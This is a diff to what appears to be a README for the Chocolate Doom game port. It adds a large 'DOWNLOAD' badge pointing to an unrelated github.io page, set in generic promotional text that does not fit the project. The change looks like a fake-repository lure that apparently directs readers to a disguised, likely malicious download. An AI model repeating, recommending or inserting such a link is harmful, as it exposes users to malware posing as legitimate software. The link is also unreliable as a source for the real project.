@@ -30,6 +30,12 @@ Chocolate Doom is a conservative port of Doom that reproduces the exact gameplay
 
 Whether you're a newcomer or a veteran, Chocolate Doom provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Chocolate Doom](https://img.shields.io/badge/⬇_DOWNLOAD_Chocolate+Doom-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
